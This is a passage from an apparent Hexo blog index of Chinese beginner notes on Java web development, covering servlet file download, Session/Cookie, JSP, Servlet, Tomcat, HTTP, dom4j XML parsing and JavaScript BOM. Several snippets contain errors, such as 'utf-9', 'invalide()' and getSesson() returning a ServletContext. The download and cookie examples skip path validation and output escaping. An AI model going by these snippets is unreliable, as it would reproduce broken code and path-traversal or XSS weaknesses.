request.getSession.getServletContext();String realPath = app.getRealPath("/download");//确定需要下载的文件对象File file = new File(realPath + File.separator + fileName);//读取 file 文件InputStream in = new FileInputStream(file);int len = 0;//每次读取的长度byte[] buffer = new byte[1024];//设置文件名编码格式fileName = URLEncoder.encode(fileName,"utf-8"));//设置文件下载头，指定浏览器以下载的方式打开。若不设置下载头则图片会显示在浏览器上而不是下载response.setHeader("Content-disposition", "attachment;filename=" + fileName);ServletOutputStream out = response.getOutputStream();while ((len = in.read(buffer)) != -1) {//写出到浏览器out.write(buffer, 0, len);}out.close();in.close();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Servlet </tag>
            
            <tag> upload </tag>
            
            <tag> download </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>会话技术之 Session 和 Cookie</title>
      <link href="/2017/04/25/session-cookie/"/>
      <url>/2017/04/25/session-cookie/</url>
      
        <content type="html"><![CDATA[<p>浏览器和服务器通信的过程中会产生一些数据，Session 技术可以解决这些数据的保存问题。<br>会话技术有两种：</p><ul><li>Cookie - 浏览器端的数据存储，将数据保存在浏览器端</li><li>Session - 服务器端的数据存储，将数据保存在服务器端</li></ul><span id="more"></span><h2 id="使用-Cookie-技术保存数据"><a href="#使用-Cookie-技术保存数据" class="headerlink" title="使用 Cookie 技术保存数据"></a>使用 Cookie 技术保存数据</h2><p>保存数据，服务器向浏览器写入 Cookie，Cookie 可包含需要保存的数据</p><p>服务端存储 Cookie：（需要在跳转页面之前）</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Cookie 缓存名 1 = new Cookie("键 1", 值 1);缓存名 1.setMaxAge(int 类型秒数);//设置缓存有效期（单位秒）缓存名 1.setPath(request.getContexxtPath());//设置缓存路径Cookie 缓存名 2 = new Cookie("键 2", 值 2);缓存名 2.setMaxAge(int 类型秒数);//设置缓存有效期（单位秒）缓存名 2.setPath(request.getContexxtPath());//设置缓存路径response.addCookie(缓存名 1);response.addCookie(缓存名 2);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>setMaxAge(0) 表示强制删除缓存</p></blockquote><p>浏览器取出 Cookie：</p><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">String 键 1 = "";String 键 2 = "";Cookie[] cookies = request.getCookies();//数组！if (cookies != null) {//要判断是否为空！for (Cookie cookie : cookies) {String cookieName = cookie.getName();if (cookieName.equals("键 1")) {键 1 = cookie.getValue();} else if (cookieName.equals("键 2")) {键 2 = cookie.getValue();}}}&lt;!-- 页面显示调用 --&gt;&lt;input type="text" value = "&lt;%= 键 1 %&gt;" .../&gt;&lt;input type="text" value = "&lt;%= 键 2 %&gt;" .../&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>服务器端保存数据的技术</p><p>保存 Session 数据</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">HttpSession session = request.getSession();session.setAttribute("键", 值);//可以是对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>JSP 取出 Session 数据</p><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">session.getAttribute("键");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>清除 Session 数据<br>session.invalide();</p><blockquote><p>Servlet 对象：浏览器第一次访问 servlet 服务程序时创建（init()），服务器停止时销毁。<br>ServletConfig 对象：Servlet 对象初始化的时候创建（init()）<br>request 和 response 对象：每一次请求都会创建一组 request 和 response，一次请求结束时销毁。<br>ServletContext 对象：服务器启动时创建，服务器停止时销毁<br>Session 对象：保存服务器和浏览器通信数据的技术，当浏览器第一次访问 <code>request.getSession()</code> 时会为每一个用户创建一个独有的 Session 对象。session 对象默认会在无人调用 30 分钟后自动销毁。也可通过 <code>session.invalide();</code> 配置 web.xml 文件设置销毁设置：</p></blockquote><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;session-config&gt;&lt;!-- 单位为分钟 --&gt;&lt;session-timeout&gt;20&lt;/session-timeout&gt;&lt;/session-config&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong></p><ul><li><strong>正常</strong>关闭服务器的话是不会销毁 session 对象的，session 持久化到硬盘上，同样也是默认在 30 分钟后销毁。</li><li><strong>非正常</strong>关闭服务器的话会直接销毁 session 对象</li></ul><p>request.getSession();会判断当前服务器有没有为该用户创建 session 对象，如果有 session 对象或拿到已经创建好的 session 对象，则为用户服务，如果没有，就创建<br>如果已经为用户创建了 session 那么会写给浏览器一个 cookie 对象（JSESSIONID）<br>当浏览器再次访问服务器的时候，会携带 cookie 对象（JESSIONID）<br>浏览器会话时间结束：关闭浏览器</p><h2 id="域-scope-对象"><a href="#域-scope-对象" class="headerlink" title="域(scope) 对象"></a>域(scope) 对象</h2><ul><li>域对象是个容器，request、session 和 application</li><li>域对象有作用范围：<ul><li>request：一次请求中（每次请求都有 request 对象）</li><li>session：一次会话中（每个用户都有一个 session 对象）</li><li>application：服务器的生命周期中（并且所有用户共享）</li></ul></li></ul><blockquote><p>getAttribute() 和 getParamater() 不要搞混了哟：<br>request.getAttribute() 是从 request 容器中获取，返回对象，必然会有转发<br>request.getParameter() 获取页面中的参数，返回字符串</p></blockquote><p>避免从缓存中取数据的方法：在请求地址后面加上一个当前时间的参数：</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">img.src = "&lt;% lujing %&gt;/img?time = " + new Date().getTime();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> Session </tag>
            
            <tag> Cookie </tag>
            
            <tag> 域对象 </tag>
            
            <tag> scope </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 JSP</title>
      <link href="/2017/04/24/jsp/"/>
      <url>/2017/04/24/jsp/</url>
      
        <content type="html"><![CDATA[<p>JSP (Java Server Page) 和 Servlet 都是用来解决动态 web 资源的技术。</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>JSP 页面可以嵌入 Java 脚本，JSP 从本质上讲就是一个 Servlet，访问 JSP 页面本质上就是访问 JSP 对应的 Servlet 程序。<br>work/Catalina/localhost/项目名/org/apache/jsp/网页名<br>找到 JSP 对应的 servlet 的 class 文件，该类继承了 HttpJspBase（继承了 HttpServlet）</p><h2 id="JSP-语法"><a href="#JSP-语法" class="headerlink" title="JSP 语法"></a>JSP 语法</h2><ul><li>JSP 模板元素<br>就是 JSP 页面中的 HTML 代码，定义了网页的基本骨架</li><li>JSP 脚本片段<br><code>&lt;% 脚本代码 %&gt;</code></li><li>JSP 表达式<pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">&lt;%=变量名%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>脚本表达式后面不能加分号！脚本片段中每行代码需要加分号！</strong></p></blockquote></li><li>脚本声明(不常用)，对应 Java 类中<pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">&lt;%!Java 代码private String name;static {}public static void main(String[] args) {}public void run() {}%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>JSP 注释<pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">&lt;%-- 注释内容 --%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>此注释在网页源码中看不到</p></blockquote></li><li>JSP 指令<br>`&lt;%@ 指令类型 属性 %&gt;<ul><li><p>page 指令：让 JSP 页面选择开发语言</p><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" import="java.util*, java...."%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>language:让 JSP 页面选择开发的语言<br>import: 导入 jar 包，jsp 自带的包（servlet.* servlet.http.* servlet.jsp.* java.lang），可以在同一个 import 属性下(用逗号隔开)，也可以分多行写<br>pageEncoding: 设置页面的编码<br>contentType：设置服务器响应编码<br>isThreadSafe： 设置线程是否安全（默认为 true 线程安全）<br>buffer：设置 out 缓存（默认 8 kb）， out 对象输出到浏览器两种情况<br>  1.等文档加载完毕<br>  2.缓冲区已满</p></li><li><p>include 指令：</p></li></ul></li></ul><p>想 jsp 页面中天健一个片段文件 .jspf</p><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">&lt;%@ include file="xxx.jspf "%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jspf 片段页面<br>    - taglib 指令：<br>标签库 jstl</p><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">&lt;%@ taglib %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>JSP 内置对象<ul><li>request</li><li>response</li><li>out</li><li>session</li><li>pageContext</li><li>ServletContext application</li><li>ServletConfig config</li><li>page</li><li>Throwable exception(只有当页面设置了 isErrorPage=”true” 时才出现)</li></ul></li></ul><h2 id="转发原理"><a href="#转发原理" class="headerlink" title="转发原理"></a>转发原理</h2><ul><li>只有一次请求</li><li>转发不会引起地址栏刷新</li><li>转发可以携带数据，通过 <code>request.setAttribute();</code></li><li>转发也不能形成回路</li></ul><blockquote><p>重定向不可以携带数据<br>转发和重定向不可同时使用</p></blockquote><h2 id="使用-Servlet-JSP-完成-web-开发"><a href="#使用-Servlet-JSP-完成-web-开发" class="headerlink" title="使用 Servlet + JSP 完成 web 开发"></a>使用 Servlet + JSP 完成 web 开发</h2><blockquote><p>MVC(Model View Controller) 设计模式<br>Servlet 负责逻辑控制，数据获取<br>JSP 负责数据接收，页面的显式<br>model 对数据进行 CRUD （Dao + entity）)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 Servlet</title>
      <link href="/2017/04/21/servlet/"/>
      <url>/2017/04/21/servlet/</url>
      
        <content type="html"><![CDATA[<h2 id="Servlet-生命周期"><a href="#Servlet-生命周期" class="headerlink" title="Servlet 生命周期"></a>Servlet 生命周期</h2><ol><li>初始化阶段<br>第一次访问 Servlet 时，调用 init() 方法<br>之后再次访问该 Servlet 时，会使用已经创建好的 servlet 为用户服务<br>Servlet 是一个多线程的。</li><li>服务阶段(响应客户请求)<br>会调用 service() 方法</li><li>终止阶段<br>服务器关闭的时候会调用 destroy() 方法</li></ol><span id="more"></span> <br>## Servlet 相关对象的创建### request (客户端请求对象)<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">request.getParameter("safsd");//获取指定参数的值request.getParameterValues("safsdf");//获取指定参数的数组request.getContextPath();//获取项目根路径Enumeration request.getHeaderNames();//获取请求头列表request.getHeader("User-Agent");//获取指定请求头内容request.getMethod();//获取请求方式request.getRequestURL();//获取请求的路径request.getResquestURI();//获取请求的资源在服务器中的位置（相对位置 ）request.getRemoteHost();//获取客户端的 IP 地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### response (浏览器的响应对象)<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">response.setContentType("text/html;charset=utf-9");//设置服务器的响应PrintWriter out = response.getWriter();//获取服务器的输出字符流OutputStream os = response.getOutputStream();//输出字节流流response.sendRedirect(request.getContextPath() + "/xxxx");//请求重定向<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>&gt;只能获取一个输出流<br>### ServletConfig (servlet 配置信息对象)init(ServletConfig config) 时可以获取 web.xml 内 <servlet> 标签下配置的 <init-param> 属性<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String charset = config.getInitParameter("charset");String name = config.getInitParameter("name");config.getInitParameterNames();//获取所有的初始化参数的 name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;servlet&gt;...&lt;init-param&gt;&lt;param-name&gt;chaarset&lt;/param-name&gt;&lt;param-value&gt;utf-8&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;name&lt;/param-name&gt;&lt;param-value&gt;value&lt;/param-value&gt;&lt;/init-param&gt;&lt;/servlet&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### ServletContext (代表当前的 web 应用)该对象会在服务器启动的时候创建，在服务器关闭的时候销毁。获取 ServletContext 对象方法：1. 通过 `this.getServletContext()` 方法<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">ServletContext application = this.getServletContext();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>通过 <code>request.getSesson()</code> 方法<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">ServletContext application = request.getSesson()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>ServletContext 对象的用途：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">application.getContextPath();//获取当前 web 应用路径application.getInitParameter("contextname");//获取 web 初始化参数(该参数配置在 web.xml 文件的根标签中) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;context-param&gt;&lt;param-name&gt;contextname&lt;/param-name&gt;&lt;param-value&gt;contextvalue&lt;/param-value&gt;&lt;/context-param&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>## 创建 Servlet 文件<br>## 使用一个 Servlet 完成 CRUD<br>## ※ 重定向的概念 ※<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">response.sendRedirect("重定向地址");response.sendRedirect(request.getContextPath() + "/xxxx");//请求重定向<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>会创建两组 request 和 response 对象</li><li>会导致浏览器的地址栏刷新</li><li>可以多次重定向但是不能形成死循环</li><li>重定向前不能关闭 response 的输出流（服务器会自动关闭流）</li></ol><br>## 服务器响应状态码302 重定向200 ok404 找不到资源500 服务器内部错误304 表示从缓存中取数据<br>### 配置错误页面在 web.xml 中配置错误处理页面<pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;error-page&gt;&lt;error-code&gt;404&lt;/error-code&gt;&lt;location&gt;/404.html&lt;/location&gt;&lt;/error-page&gt;&lt;error-page&gt;&lt;error-code&gt;500&lt;/error-code&gt;&lt;location&gt;/500.html&lt;/location&gt;&lt;/error-page&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></init-param></servlet>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Servlet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web 基本概念</title>
      <link href="/2017/04/19/java-web-basis/"/>
      <url>/2017/04/19/java-web-basis/</url>
      
        <content type="html"><![CDATA[<p>Web 就是网页的意思，互联网上主机提供的对外访问的资源。</p><ul><li>静态 Web 资源：网页内容不会随时间改变，不能和后台交互，如 HTML + CSS + JS → jQuery。</li><li>动态 Web 资源：网页内容会随时间而改变，可以与后台交互，如 servlet/jsp。</li></ul><span id="more"></span><p>软件开发模式：<br>B/S 架构：浏览器服务器模式<br>C/S 架构：客户端服务器模式</p><h2 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h2><p>Java Web 就是 Java 提供 Web 资源访问的技术总成</p><blockquote><p>与其他语言的 Web 资源访问技术对比：</p><ul><li>asp.net —— 小型 Web 应用，快速开发</li><li>php —— 做网站，性能好，速度快，但是没有 Java Web 安全。</li><li>Java Web —— 企业级 Web 应用</li></ul></blockquote><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>安装了服务程序的计算机就是服务器。</p><h2 id="常用服务器"><a href="#常用服务器" class="headerlink" title="常用服务器"></a>常用服务器</h2><ul><li>apache-tomcat —— 免费开源的服务器<br>只支持 Servlet 和 jsp 规范</li><li>weblogic —— IBM 公司开发的收费的商业服务器<br>支持 13 中技术规范（netbeans）</li><li>websphere —— 收费的商业版服务器<br>支持 13 中技术规范（netbeans）</li><li>jboss —— 免费开源的服务器<br>支持除了 Servlet 和 jsp 的其他技术规范</li><li>Java EE 服务器<br>两台 tomcat 搭一台 jboss 服务器</li></ul><blockquote><p>Java EE 有 13 钟技术规范<br>JDBC<br>JNDI<br>EJBs<br>RMI<br>JSP</p></blockquote><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>官方网站下载</p><h3 id="启动与关闭"><a href="#启动与关闭" class="headerlink" title="启动与关闭"></a>启动与关闭</h3><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li>bin 目录 —— 存放了 Tomcat 的指令代码，包括启动、停止等</li><li>conf 目录 —— 存放 Tomcat 的配置文件（.xml 和 .properties）</li><li>lib 目录 —— 存放了支持 Tomcat 运行的 jar 文件 </li><li>logs 目录 —— 日志目录，存放了 Tomcat 运行过程中记录</li><li>temp 目录 —— 存放 Tomcat 临时文件</li><li>webapps 目录 —— Web 应用存放的目录</li><li>work 目录 —— Tomcat 的工作目录（将 jsp 文件编译成 .class 文件）</li></ul><h3 id="Tomcat-虚拟目录映射"><a href="#Tomcat-虚拟目录映射" class="headerlink" title="Tomcat 虚拟目录映射"></a>Tomcat 虚拟目录映射</h3><p>将存在的 Web </p><h3 id="配置-Tomcat"><a href="#配置-Tomcat" class="headerlink" title="配置 Tomcat"></a>配置 Tomcat</h3><p>配置 server.xml<br>在 <host name="localhost"> 标签下面添加 Context 标签</host></p><pre class="line-numbers language-none"><code class="language-none">&lt;Context docBase="磁盘路径" path="/映射路径"&gt;&lt;/Context&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或<br>在 conf/Catelina/localhost 目录中添加一个 “映射路径.xml” 文件(若为 ROOT.xml 则为缺省)<br>并编辑内容为 <context docbase="磁盘路径"></context><br>此方法不需要重新启动 tomcat 服务器</p><p>该代码表示在浏览器中输入 localhost/映射路径 时，将访问 【磁盘路径】的网页</p><h3 id="去除端口"><a href="#去除端口" class="headerlink" title="去除端口"></a>去除端口</h3><p>配置 server.xml 文件<br>设置 <host name="localhost"> 端口为 80 端口。</host></p><h3 id="配置-servlet-的映射"><a href="#配置-servlet-的映射" class="headerlink" title="配置 servlet 的映射"></a>配置 servlet 的映射</h3><p>配置 jsp 映射<br>配置监听器，过滤器的映射<br>配置错误处理页面</p><h2 id="http-协议"><a href="#http-协议" class="headerlink" title="http 协议"></a>http 协议</h2><p>HTTP 是 hypertext transfer protocol（超文本传输协议）的简写，它是 TCP/TP 协议的一个应用层协议，用于定义 web 浏览器 与 web 服务器之间交换数据的过程：<br>版本：</p><ul><li>Http 1.0 只支持单个 web 资源的访问</li><li>HTTP 1.1 支持多个 web 资源访问</li></ul><h3 id="客户端请求"><a href="#客户端请求" class="headerlink" title="客户端请求"></a>客户端请求</h3><p>GET /baidu/index.heml HTTP/1.1<br>请求的消息投（请求方式，请求资源路径+参数，请求的协议）<br>Host : localhost:8080<br>请求的主机地址和端口号<br>Connection: keep-alive<br>访问完毕后服务器保持链接<br>Cache-Control: max-age=0<br>缓存控制，&gt;=0 表示支持缓存<br>Upgrade-Insecure-Requests: 1<br>自动将 HTTP 协议 升级为 HTTPS<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<br>浏览器信息<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>告诉服务器能够接受的数据类型<br>Accept-Encoding: gzip, deflate, sdch, br<br>支持的压缩格式<br>Accept-Language: zh-CN,zh;q=0.8<br>浏览器使用的语言<br>If-None-Match: W/“20-1492573751023”<br>记录修改的时间，精确到毫秒<br>If-Modified-Since: Wed, 19 Apr 2017 03:49:11 GMT<br>记录上次修改的时间，精确到秒</p><p>POST 请求</p><h3 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h3><p>HTTP/1.1 200 OK<br>响应消息航（协议，响应的状态吗）<br>Server: Apache-Coyote/1.1<br>服务器类型<br>ETag: W/“”<br>访问资源最后修改的时间<br>Last-Modified: Wed,…<br>访问资源最后修改的时间精确到秒<br>Content-Type: text/html<br>富强武器响应的数据类型<br>Content-Length: 184<br>服务器相应数据的长度<br>Date:<br>响应的时间</p><h2 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h2><p>Servlet（Server applet）—— 服务器端小程序<br>servlet 3.1 版本 — 4.0<br>可以实现网页的动态 web 资源访问</p><h3 id="开发-servlet-步骤"><a href="#开发-servlet-步骤" class="headerlink" title="开发 servlet 步骤"></a>开发 servlet 步骤</h3><p>1.<br>2. 在 classes 目录编写一个 HelloServlet.java<br>extends GenericServlet<br>3. 编译生成.class 文件</p><ol><li>获取一个服务器写出流<pre class="line-numbers language-none"><code class="language-none">PrintWriter out = res.getWriter();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>写出服务器响应</li><li>配置 server.xml 映射<pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;!--映射路径--&gt;&lt;servlet&gt;&lt;servlet-name&gt;helloServlet&lt;/servlet-name&gt;&lt;servlet-class&gt;com.crazybunqnq.HelloServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;!--映射--&gt;&lt;servlet-mapping&gt;&lt;servlet-name&gt;helloServlet&lt;/servlet-name&gt;&lt;url-pattern&gt;/hello&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>javac -cp jar 包路径 -d pakage 路径 java 文件.java<br>javac -cp .\servlet-api.jar -d . HelloServlet.java<br>-cp 确定添加的 classpath 路径<br>-d 生成对应的 pakage 文件夹<br>. 当前目录</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> Web </tag>
            
            <tag> tomcat </tag>
            
            <tag> http 协议 </tag>
            
            <tag> servlet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML 解析</title>
      <link href="/2017/04/18/xml-jie-xi/"/>
      <url>/2017/04/18/xml-jie-xi/</url>
      
        <content type="html"><![CDATA[<p>XML (Extenstion Markup Language 扩展性标记语言)，可以用来做资源配置文件(.properties, xml)、数据的传输格式(json, xml 数据)。</p><span id="more"></span><h2 id="XML-语法"><a href="#XML-语法" class="headerlink" title="XML 语法"></a>XML 语法</h2><ul><li>标签必须要闭合，不存在单标记</li><li>标签不能嵌套</li><li>标签名可以任意写</li></ul><h2 id="XML-基本结构"><a href="#XML-基本结构" class="headerlink" title="XML 基本结构"></a>XML 基本结构</h2><p><strong>XML (1994) 只有一个版本 1.0</strong></p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;? xml version="1.0" encoding="utf-8" ?&gt;&lt;根标记&gt;&lt;标记&gt;&lt;/标记&gt;&lt;/根标记&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="XML-的两种校验"><a href="#XML-的两种校验" class="headerlink" title="XML 的两种校验"></a>XML 的两种校验</h2><p>用来约束 XML 文档的，规定 XML 中该写什么，不该写什么。</p><ul><li>dtd 校验：校验可以做一些基本校验</li><li>schema 校验：做精确的校验</li></ul><h3 id="dtd-校验"><a href="#dtd-校验" class="headerlink" title="dtd 校验"></a>dtd 校验</h3><p>举例：user.xml 文件,规则：要求根标记为 users，users 下只能有 user 标签。<br><users></users></p><pre><code>&lt;user id="必选" height="可选"&gt;    &lt;uname&gt;&lt;/uname&gt;    &lt;upwd&gt;&lt;/upwd&gt;    &lt;age&gt;&lt;/age&gt;    &lt;sex&gt;&lt;/sex&gt;&lt;/user&gt;</code></pre><p>创建 users.dtd 文件，</p><h3 id="schema-校验"><a href="#schema-校验" class="headerlink" title="schema 校验"></a>schema 校验</h3><br>## XML 解析(CRUD)用编程语言对 XML 进行操作<h3 id="dom-解析"><a href="#dom-解析" class="headerlink" title="dom 解析"></a>dom 解析</h3><p>dom 解析会将整个 XML 文档加载到内存中，形成 DOM 树。</p><ul><li>优点：操作非常方便，对于数据存储比较小的 XML 有很大优势。</li><li>缺点：处理 XML 数据比较多的时候，性能不高。</li></ul><h3 id="sax-解析"><a href="#sax-解析" class="headerlink" title="sax 解析"></a>sax 解析</h3><p>sax 解析以事件驱动的方式来解析文档</p><ul><li>优点：适合处理 XML 数据比较多的时候，查询方便，效率高</li><li>缺点：操作麻烦，<strong>不支持修改</strong></li></ul><h3 id="dom4j-dom-for-java"><a href="#dom4j-dom-for-java" class="headerlink" title="dom4j (dom for java)"></a>dom4j (dom for java)</h3><p>结合了 dom 解析和 sax 解析的优点<br>步骤：</p><ol><li><p>导入 jar 包（dom4j）</p> <pre class="line-numbers language-none"><code class="language-none">org.dom4j.Document;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取一个 XML 解析器 SAXReader</p> <pre class="line-numbers language-none"><code class="language-none">SAXReader sax = new SAXReader();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>读取 XML 文档</p> <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Document doc = sax.read("文件名称.xm");//将 doc.asXML;//获取 XML 中写入的值（标签名）doc.getStringValue("标签名");//获取文档根节点Element root = doc.getRootElement();//根据 id 获取元素Element element = doc.elementByID("id");//获取元素标签名root.getName();//获取所有子元素List&lt;Element&gt; elements = root.elements();//获取指定元素root.element("元素名");//获取属性Attribute attr = element.attribute("属性名");//获取属性值attr.getData();//获取所有的属性element.attributes();//在根节点内添加元素Element element = root.addElement("元素名")//在元素中添加属性element.addAttribute("属性名","属性值");//在指定元素中添加元素值element.addElement("元素名").addText("元素之");//规范 XML 格式OutputFormat format = OutputFormat.creatPrettyPrint();format.setEncoding("utf-8");//将数据写入 XML 文档XMLWriter writer = new XMLWriter(new FileWriter("users.xml"), format);writer.write(doc);writer.close();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 之 BOM 和 DOM 对象</title>
      <link href="/2017/04/14/javascript-s-bom-and-dom/"/>
      <url>/2017/04/14/javascript-s-bom-and-dom/</url>
      
        <content type="html"><![CDATA[<ul><li>[BOM：浏览器窗口对象](/2017/04/14/BOM 和 DOM/#HTML BOM 对象)</li><li>[DOM：文档对象](/2017/04/14/BOM 和 DOM/#HTML DOM 对象)</li></ul><span id="more"></span><h2 id="HTML-BOM-对象"><a href="#HTML-BOM-对象" class="headerlink" title="HTML BOM 对象"></a>HTML BOM 对象</h2><ul><li><a href="http://www.w3school.com.cn/jsref/dom_obj_window.asp">Window 对象</a><br>Window 对象表示浏览器中打开的窗口。<br>如果文档包含框架（frame 或 iframe 标签），浏览器会为 HTML 文档创建一个 window 对象，并为每个框架创建一个额外的 window 对象。<blockquote><p>直接在 <code>&lt;script&gt;</code> 标签下设置的全局变量，都属于 window 对象。<br>反过来，调用 window 对象可以直接使用 <code>对象名</code> 而不需要使用 <code>window.对象名</code>。</p></blockquote></li><li><strong><a href="http://www.w3school.com.cn/jsref/dom_obj_navigator.asp">Navigator 对象</a></strong><br>Navigator 对象包含有关浏览器的信息。</li><li><strong><a href="http://www.w3school.com.cn/jsref/dom_obj_screen.asp">Screen 对象</a></strong><br>Screen 对象包含有关客户端显示屏幕的信息。</li><li><strong><a href="http://www.w3school.com.cn/jsref/dom_obj_history.asp">History 对象</a></strong><br>History 对象包含用户（在浏览器窗口中）访问过的 URL。<blockquote><p>History 对象是 Window 对象的一部分，可通过 <code>window.history</code> 属性对其进行访问。</p></blockquote></li><li><strong><a href="http://www.w3school.com.cn/jsref/dom_obj_location.asp">Location 对象</a></strong><br>Location 对象包含有关当前 URL 的信息。<blockquote><p>Location 对象也是 Window 对象的一个部分，可通过 <code>window.location</code> 